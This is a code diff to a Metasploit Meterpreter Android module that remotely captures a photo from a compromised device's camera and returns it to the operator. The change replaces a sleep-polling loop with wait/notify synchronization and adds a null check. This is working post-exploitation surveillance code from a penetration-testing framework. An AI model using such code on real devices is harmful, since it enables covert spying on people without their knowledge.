@@ -1,14 +1,16 @@
 
 package com.metasploit.meterpreter.android;
 
+import android.graphics.PixelFormat;
+import android.hardware.Camera;
+import android.hardware.Camera.Parameters;
+import android.hardware.Camera.PictureCallback;
+import android.util.Log;
+
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.stdapi.webcam_audio_record;
-
-import android.hardware.Camera;
-import android.hardware.Camera.PictureCallback;
-import android.util.Log;
 
 public class webcam_get_frame_android extends webcam_audio_record implements Command {
 
@@ -16,11 +18,10 @@ public class webcam_get_frame_android extends webcam_audio_record implements Com
     private static final int TLV_TYPE_WEBCAM_IMAGE = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 1);
     private static final int TLV_TYPE_WEBCAM_QUALITY = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 3);
 
-    private volatile byte[] cameraData;
+    private byte[] cameraData;
 
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
 
-        @SuppressWarnings("unused")
         int quality = request.getIntValue(TLV_TYPE_WEBCAM_QUALITY);
                 
         try {
@@ -29,20 +30,26 @@ public class webcam_get_frame_android extends webcam_audio_record implements Com
             }
 
             cameraData = null;
+            //Parameters params = webcam_start_android.camera.getParameters();
+            //params.setPictureFormat(PixelFormat.JPEG);
+            //params.set("jpeg-quality", quality);
             webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
                 @Override
                 public void onPictureTaken(byte[] data, Camera camera) {
                     cameraData = data;
+                    synchronized (webcam_get_frame_android.this) {
+                    	webcam_get_frame_android.this.notify();
+                    }
                 }
             });
-
-            int i = 0;
-            while (cameraData == null && i < 20) {
-                Thread.sleep(1000);
-                i++;
+            
+            synchronized (this) {
+            	wait(10000);
             }
 
-            response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
+            if (cameraData != null) {
+            	response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
+            }
         } catch (Exception e) {
             Log.e(getClass().getSimpleName(), "webcam error ", e);
         }
